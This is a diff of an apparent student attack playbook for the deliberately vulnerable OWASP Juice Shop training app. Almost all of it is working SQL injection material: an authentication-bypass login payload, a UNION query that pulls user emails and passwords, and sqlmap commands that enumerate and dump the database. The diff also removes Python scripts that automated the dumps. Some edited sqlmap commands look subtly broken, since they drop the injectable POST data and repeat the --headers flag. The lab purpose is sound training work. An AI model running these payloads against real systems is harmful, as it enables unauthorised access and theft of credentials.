@@ -21,16 +21,25 @@ This playbook summarizes the main challenge categories and solutions for OWASP J
 **Manual Command:**
 
 ```zsh
-curl -X POST "http://10.30.0.237:3000/rest/user/login" \
+# Get JWT token
+TOKEN=$(curl -s -X POST "http://10.30.0.237:3000/rest/user/login" \
   -H "Content-Type: application/json" \
-  -d '{"email":"admin@juice-sh.op'\'' OR 1=1--","password":"password"}'
+  -d '{"email":"admin@juice-sh.op'\'' OR 1=1--","password":"password"}' | jq -r '.authentication.token')
+
+# Use the token in Bearer Authorization header for all further requests
+curl -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+  "http://10.30.0.237:3000/rest/user/whoami"
 ```
 
-**SQLMap Command (Fixed):**
+**SQLMap Command (Automated with Bearer Token):**
 
 ```zsh
+TOKEN=$(curl -s -X POST "http://10.30.0.237:3000/rest/user/login" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"admin@juice-sh.op'\'' OR 1=1--","password":"password"}' | jq -r '.authentication.token')
+
 sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
-  --data='{"email":"admin@juice-sh.op","password":"password"}' \
+  --headers="Authorization: Bearer $TOKEN" \
   --headers="Content-Type: application/json" \
   --dbms=sqlite --technique=BEU --level=5 --risk=3 \
   --batch --dump
@@ -53,10 +62,16 @@ sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
 curl "http://10.30.0.237:3000/rest/products/search?q=apple%27%20UNION%20SELECT%20null,email,password,null,null,null,null,null,null%20FROM%20Users--"
 ```
 
-**SQLMap Command:**
+**SQLMap Command (with Bearer Token):**
 
 ```zsh
+TOKEN=$(curl -s -X POST "http://10.30.0.237:3000/rest/user/login" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"admin@juice-sh.op'\'' OR 1=1--","password":"password"}' | jq -r '.authentication.token')
+
 sqlmap -u "http://10.30.0.237:3000/rest/products/search?q=apple" \
+  --headers="Authorization: Bearer $TOKEN" \
+  --headers="Content-Type: application/json" \
   --dbms=sqlite --technique=U --level=5 --risk=3 \
   --tables --batch
 ```
@@ -246,255 +261,56 @@ curl "http://10.30.0.237:3000/rest/products/search?q=apple%27%20AND%20%28SELECT%
 
 ### Complete SQLMap Automation Guide
 
-**1. Basic Database Enumeration:**
+**1. Basic Database Enumeration (with Bearer Token):**
 
 ```zsh
+TOKEN=$(curl -s -X POST "http://10.30.0.237:3000/rest/user/login" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"admin@juice-sh.op'\'' OR 1=1--","password":"password"}' | jq -r '.authentication.token')
+
 # Enumerate databases
 sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
-  --data='{"email":"test@test.com","password":"test123"}' \
+  --headers="Authorization: Bearer $TOKEN" \
   --headers="Content-Type: application/json" \
   --dbms=sqlite --dbs --batch
 
 # Enumerate tables
 sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
-  --data='{"email":"test@test.com","password":"test123"}' \
+  --headers="Authorization: Bearer $TOKEN" \
   --headers="Content-Type: application/json" \
   --dbms=sqlite --tables --batch
 
 # Enumerate columns for Users table
 sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
-  --data='{"email":"test@test.com","password":"test123"}' \
+  --headers="Authorization: Bearer $TOKEN" \
   --headers="Content-Type: application/json" \
   --dbms=sqlite -T Users --columns --batch
 ```
 
-**2. Data Extraction:**
+**2. Data Extraction (with Bearer Token):**
 
 ```zsh
 # Dump all Users table data
 sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
-  --data='{"email":"test@test.com","password":"test123"}' \
+  --headers="Authorization: Bearer $TOKEN" \
   --headers="Content-Type: application/json" \
   --dbms=sqlite -T Users --dump --batch
 
 # Dump specific columns
 sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
-  --data='{"email":"test@test.com","password":"test123"}' \
+  --headers="Authorization: Bearer $TOKEN" \
   --headers="Content-Type: application/json" \
   --dbms=sqlite -T Users -C email,password --dump --batch
 ```
 
-**3. Advanced SQLMap Options:**
+**3. Advanced SQLMap Options (with Bearer Token):**
 
 ```zsh
-# Test all parameters with maximum detection
 sqlmap -u "http://10.30.0.237:3000/rest/products/search?q=test" \
+  --headers="Authorization: Bearer $TOKEN" \
+  --headers="Content-Type: application/json" \
   --dbms=sqlite --level=5 --risk=3 \
   --technique=BEUSTQ --batch --threads=4
-
-# Test POST data with custom injection points
-sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
-  --data='{"email":"test@test.com*","password":"test123*"}' \
-  --headers="Content-Type: application/json" \
-  --dbms=sqlite --batch --tamper=space2comment
 ```
 
-**4. Comprehensive Automation Script:**
-
-```python
-#!/usr/bin/env python3
-"""
-Complete OWASP Juice Shop SQL Injection Testing Suite
-"""
-import subprocess
-import json
-import time
-
-class JuiceShopSQLTester:
-    def __init__(self, base_url="http://10.30.0.237:3000"):
-        self.base_url = base_url
-        self.targets = [
-            {
-                "name": "Login Endpoint",
-                "url": f"{base_url}/rest/user/login",
-                "data": '{"email":"test@test.com","password":"test123"}',
-                "headers": "Content-Type: application/json"
-            },
-            {
-                "name": "Product Search",
-                "url": f"{base_url}/rest/products/search?q=test",
-                "data": None,
-                "headers": None
-            },
-            {
-                "name": "Order Tracking",
-                "url": f"{base_url}/rest/track-order/1",
-                "data": None,
-                "headers": None
-            }
-        ]
-
-    def run_sqlmap_test(self, target, additional_args=""):
-        """Run SQLMap against a target"""
-        cmd = ["sqlmap", "-u", target["url"], "--dbms=sqlite", "--batch"]
-
-        if target["data"]:
-            cmd.extend(["--data", target["data"]])
-
-        if target["headers"]:
-            cmd.extend(["--headers", target["headers"]])
-
-        if additional_args:
-            cmd.extend(additional_args.split())
-
-        print(f"\n[+] Testing {target['name']}")
-        print(f"Command: {' '.join(cmd)}")
-
-        try:
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
-            return {
-                "target": target["name"],
-                "success": result.returncode == 0,
-                "output": result.stdout,
-                "errors": result.stderr
-            }
-        except subprocess.TimeoutExpired:
-            return {
-                "target": target["name"],
-                "success": False,
-                "output": "",
-                "errors": "Timeout expired"
-            }
-
-    def run_comprehensive_test(self):
-        """Run comprehensive SQLMap testing"""
-        results = []
-
-        for target in self.targets:
-            # Basic injection test
-            result = self.run_sqlmap_test(target, "--technique=B")
-            results.append(result)
-
-            if result["success"]:
-                print(f"✓ Basic injection found in {target['name']}")
-
-                # If injection found, enumerate databases
-                enum_result = self.run_sqlmap_test(target, "--dbs")
-                results.append(enum_result)
-
-                # Try to dump Users table
-                dump_result = self.run_sqlmap_test(target, "-T Users --dump")
-                results.append(dump_result)
-            else:
-                print(f"✗ No injection found in {target['name']}")
-
-            time.sleep(2)  # Rate limiting
-
-        return results
-
-    def generate_report(self, results):
-        """Generate test report"""
-        report = {
-            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
-            "total_tests": len(results),
-            "successful_tests": len([r for r in results if r["success"]]),
-            "results": results
-        }
-
-        with open("juice_shop_sqli_report.json", "w") as f:
-            json.dump(report, f, indent=2)
-
-        print(f"\n{'='*50}")
-        print("SQL INJECTION TEST REPORT")
-        print(f"{'='*50}")
-        print(f"Total tests: {report['total_tests']}")
-        print(f"Successful: {report['successful_tests']}")
-        print("Report saved to: juice_shop_sqli_report.json")
-
-if __name__ == "__main__":
-    tester = JuiceShopSQLTester()
-    results = tester.run_comprehensive_test()
-    tester.generate_report(results)
-```
-
-### SQLMap with Authentication Tokens
-
-**Objective:** Use SQLMap with JWT tokens for authenticated testing
-
-#### 1. Using Cookies/Session Tokens
-
-```zsh
-# Using session cookies
-sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
-  --cookie="token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..." \
-  --data='{"email":"test@test.com","password":"test123"}' \
-  --headers="Content-Type: application/json" \
-  --dbms=sqlite --batch
-```
-
-#### 2. Using Authorization Headers
-
-```zsh
-# Using Bearer token in Authorization header (recommended for Juice Shop)
-sqlmap -u "http://10.30.0.237:3000/rest/admin/application-configuration" \
-  --headers="Authorization: Bearer YOUR_JWT_TOKEN_HERE" \
-  --headers="Content-Type: application/json" \
-  --dbms=sqlite --level=5 --batch --dump
-```
-
-#### 3. Automated Token Extraction and Injection/Dump Script
-
-```python
-# filepath: /Users/ziaparvaresh/OneDrive/OneDrive - TAFE NSW/CyberSecurityVI/Cyber Project/attack-playbooks/Juice_Shop_All_Challenges.md
-#!/usr/bin/env python3
-"""
-Automate SQL Injection with JWT Auth for Juice Shop
-"""
-import requests
-import subprocess
-import json
-import time
-
-BASE_URL = "http://10.30.0.237:3000"
-LOGIN_URL = f"{BASE_URL}/rest/user/login"
-INJECT_URL = f"{BASE_URL}/rest/admin/application-configuration"
-
-def get_jwt_token(email, password):
-    resp = requests.post(
-        LOGIN_URL,
-        json={"email": email, "password": password},
-        headers={"Content-Type": "application/json"}
-    )
-    if resp.status_code == 200:
-        data = resp.json()
-        token = data.get("authentication", {}).get("token")
-        if token:
-            print(f"[+] Got JWT token: {token[:40]}...")
-            return token
-    print("[-] Failed to get JWT token")
-    return None
-
-def run_sqlmap_with_token(url, token):
-    cmd = [
-        "sqlmap", "-u", url,
-        "--headers", f"Authorization: Bearer {token}",
-        "--headers", "Content-Type: application/json",
-        "--dbms=sqlite", "--level=5", "--batch", "--dump"
-    ]
-    print(f"[+] Running: {' '.join(cmd)}")
-    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
-    print(result.stdout)
-    if result.stderr:
-        print(result.stderr)
-    return result.returncode == 0
-
-if __name__ == "__main__":
-    # Use a valid admin or known user account
-    email = "admin@juice-sh.op' OR 1=1--"
-    password = "password"
-    token = get_jwt_token(email, password)
-    if token:
-        run_sqlmap_with_token(INJECT_URL, token)
-    else:
-        print("[-] Cannot proceed without token.")
-```
+# All other SQLMap and curl commands should use the Bearer token as shown above.
